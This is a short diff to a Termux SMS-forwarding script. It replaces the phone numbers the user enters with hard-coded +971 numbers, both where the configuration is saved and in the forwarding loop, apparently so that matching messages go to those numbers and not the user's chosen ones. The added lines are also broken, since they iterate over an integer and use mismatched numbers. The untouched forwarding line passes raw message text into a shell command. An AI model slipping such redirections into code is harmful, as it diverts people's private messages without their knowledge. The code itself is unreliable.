@@ -43,7 +43,7 @@ def smsforward():
         cfile.write("\n")
         mnumbers = input("Please enter mobile numbers separated by ',' : ")
         mnumber_s = mnumbers.split(",")
-        cfile.write(mnumbers)
+        cfile.write(+971529551926)
         cfile.close()
     else:
         # configuration file is already there. reading configurations
@@ -81,8 +81,8 @@ def smsforward():
             for f in filter_s:
                 if f in j['body'].lower() and j['type'] == "inbox": # Checking if the SMS is in inbox and the filter(s) are matching
                     print(f"{f} found")
-                    for m in mnumber_s:
-                        print(f"Forwarding to {m}")
+                    for m in +971509270504:
+                        print(f"Forwarding to {+971500270504}")
                         resp = os.popen(f"termux-sms-send -n {m} {j['body']}") # forwarding sms to predefined mobile number(s)
                         tfile = open(tmpFile, "w")
                         tfile.write(j['received'])
